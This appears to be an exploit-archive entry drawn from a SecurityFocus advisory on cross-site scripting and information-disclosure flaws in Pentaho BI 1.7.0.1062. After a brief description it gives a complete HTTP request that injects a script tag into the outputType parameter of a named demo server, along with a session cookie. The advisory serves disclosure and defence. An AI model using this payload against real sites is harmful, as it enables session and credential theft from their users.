@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/36672/info
+
+Pentaho BI is prone to multiple cross-site scripting and information-disclosure vulnerabilities because it fails to properly validate user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks. The attacker may also exploit these issues to obtain sensitive session information.
+
+Pentaho BI 1.7.0.1062 is vulnerable; other versions may also be affected. 
+
+GET /pentaho/ViewAction?&
+outputType=khgj345<script>alert('Pwnd')</script>kjh3535
+&solution=opentaps&action=CustomerLifeTimeOrders.xaction&path=Customer%20Analysis
+HTTP/1.0
+User-Agent: Opera/9.63 (Windows NT 5.1; U; en) Presto/2.1.1
+Host: demo1.opentaps.org:8181
+Accept: text/html, application/xml;q=0.9, application/xhtml+xml,
+image/png, image/jpeg,
+image/gif, image/x-xbitmap, */*;q=0.1
+Accept-Language: it-IT,it;q=0.9,en;q=0.8
+Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
+Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
+Referer: http://www.example.com:8181/pentaho/ViewAction?solution=opentaps&path=
+Customer%20Analysis&action=CustomerLifeTimeOrders.xaction
+Cookie: JSESSIONID=85740C182994F78946BE8A38605396B1
+Cookie2: $Version=1
+Proxy-Connection: Keep-Alive
